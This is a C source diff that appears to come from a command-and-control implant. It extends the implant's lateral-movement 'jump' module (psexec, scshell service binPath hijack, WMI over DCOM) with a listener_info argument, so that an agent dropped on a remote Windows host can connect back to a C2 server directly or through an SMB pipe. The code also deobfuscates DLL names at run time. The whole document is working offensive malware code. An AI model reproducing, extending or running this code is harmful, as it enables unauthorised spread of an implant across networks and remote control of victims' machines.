@@ -1036,7 +1036,7 @@ static void _jump_pipe_name(char *buf, int bufsize) {
 
 static BOOL _jump_psexec(Buffer *out, const wchar_t *target,
                          const unsigned char *payload, DWORD payload_len,
-                         BOOL chained) {
+                         BOOL chained, const char *listener_info) {
     char _da[] = S_ADVAPI32_DLL; _DEOBF(_da);
     char _dk[] = S_KERNEL32_DLL; _DEOBF(_dk);
     HMODULE hAdv = LoadLibraryA(_da);
@@ -1114,6 +1114,8 @@ static BOOL _jump_psexec(Buffer *out, const wchar_t *target,
     swprintf(svcName, 16, L"%ls", wRname);
     if (chained)
         swprintf(binPath, 512, L"%%SystemRoot%%\\%hs.exe PIPE:%hs", rname, pipe_name);
+    else if (listener_info[0] != '\0')
+        swprintf(binPath, 512, L"%%SystemRoot%%\\%hs.exe %hs", rname, listener_info);
     else
         swprintf(binPath, 512, L"%%SystemRoot%%\\%hs.exe", rname);
 
@@ -1172,7 +1174,7 @@ static BOOL _jump_psexec(Buffer *out, const wchar_t *target,
 
 static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
                           const unsigned char *payload, DWORD payload_len,
-                          BOOL chained) {
+                          BOOL chained, const char *listener_info) {
     /* scshell: hijack existing service's binPath, no file drop.
      * We change a stopped service's binPath to run the agent from a UNC path
      * or from a one-liner. The payload bytes are the agent binary — we need
@@ -1287,6 +1289,8 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
     wchar_t newBinPath[512];
     if (chained)
         swprintf(newBinPath, 512, L"%%SystemRoot%%\\%hs PIPE:%hs", fname, pipe_name);
+    else if (listener_info[0] != '\0')
+        swprintf(newBinPath, 512, L"%%SystemRoot%%\\%hs %hs", fname, listener_info);
     else
         swprintf(newBinPath, 512, L"%%SystemRoot%%\\%hs", fname);
 
@@ -1532,7 +1536,7 @@ typedef HRESULT (WINAPI *fn_VariantClear_t)(_VARIANT *);
 
 static BOOL _jump_wmiexec(Buffer *out, const wchar_t *target,
                           const unsigned char *payload, DWORD payload_len,
-                          BOOL chained) {
+                          BOOL chained, const char *listener_info) {
     /* WMI lateral movement via COM/DCOM.
      * Upload payload to \\target\C$\Windows\Temp\<rand>.exe
      * then execute via Win32_Process.Create over DCOM.
@@ -1691,6 +1695,8 @@ static BOOL _jump_wmiexec(Buffer *out, const wchar_t *target,
     wchar_t cmdLine[512];
     if (chained)
         swprintf(cmdLine, 512, L"C:\\Windows\\Temp\\%hs.exe PIPE:%hs", rname, pipe_name);
+    else if (listener_info[0] != '\0')
+        swprintf(cmdLine, 512, L"C:\\Windows\\Temp\\%hs.exe %hs", rname, listener_info);
     else
         swprintf(cmdLine, 512, L"C:\\Windows\\Temp\\%hs.exe", rname);
     _VARIANT vCmd;
@@ -1768,8 +1774,11 @@ void mod_jump(Buffer *out, const unsigned char *args, DWORD args_len) {
     }
 
     /* Parse wire format:
-     *   [1B method] [1B flags] [4B target_len] [target\0] [4B payload_len] [payload]
+     *   [1B method] [1B flags] [4B target_len] [target\0]
+     *   [4B listener_info_len] [listener_info\0]
+     *   [4B payload_len] [payload]
      * flags bit 0: server-connection (1=direct to C2, 0=chained via pipe)
+     * listener_info: "C2SMB:<pipe>" for SMB listener, "\0" for HTTP/default
      */
     DWORD off = 0;
     BYTE method = args[off++]; /* 0=psexec, 1=wmiexec, 2=scshell */
@@ -1783,6 +1792,21 @@ void mod_jump(Buffer *out, const unsigned char *args, DWORD args_len) {
     char target[256] = {0};
     memcpy(target, args + off, tgt_len > 255 ? 255 : tgt_len);
     off += tgt_len;
+
+    /* Parse listener_info */
+    if (off + 4 > args_len) {
+        BUF_STR(out, "[-] Malformed jump args (listener_info len)\n");
+        return;
+    }
+    DWORD info_len = *(DWORD *)(args + off); off += 4;
+    if (off + info_len > args_len) {
+        BUF_STR(out, "[-] Malformed jump args (listener_info truncated)\n");
+        return;
+    }
+    char listener_info[256] = {0};
+    if (info_len > 1) /* more than just null terminator */
+        memcpy(listener_info, args + off, info_len > 255 ? 255 : info_len);
+    off += info_len;
 
     if (off + 4 > args_len) {
         BUF_STR(out, "[-] Malformed jump args (payload len)\n");
@@ -1803,15 +1827,17 @@ void mod_jump(Buffer *out, const unsigned char *args, DWORD args_len) {
     const char *method_names[] = {"psexec", "wmiexec", "scshell"};
     if (method > 2) { BUF_STR(out, "[-] Unknown jump method\n"); return; }
     BOOL chained = !(flags & 0x01);
-    snprintf(msg, sizeof(msg), "[*] jump %s → %s (%lu bytes, %s)\n",
+    snprintf(msg, sizeof(msg), "[*] jump %s -> %s (%lu bytes, %s%s%s)\n",
              method_names[method], target, payload_len,
-             chained ? "chained" : "server-connection");
+             chained ? "chained" : "server-connection",
+             listener_info[0] ? " via " : "",
+             listener_info[0] ? listener_info : "");
     buf_append(out, msg, (DWORD)strlen(msg));
 
     switch (method) {
-        case 0: _jump_psexec(out, wTarget, payload, payload_len, chained); break;
-        case 1: _jump_wmiexec(out, wTarget, payload, payload_len, chained); break;
-        case 2: _jump_scshell(out, wTarget, payload, payload_len, chained); break;
+        case 0: _jump_psexec(out, wTarget, payload, payload_len, chained, listener_info); break;
+        case 1: _jump_wmiexec(out, wTarget, payload, payload_len, chained, listener_info); break;
+        case 2: _jump_scshell(out, wTarget, payload, payload_len, chained, listener_info); break;
     }
 }
 
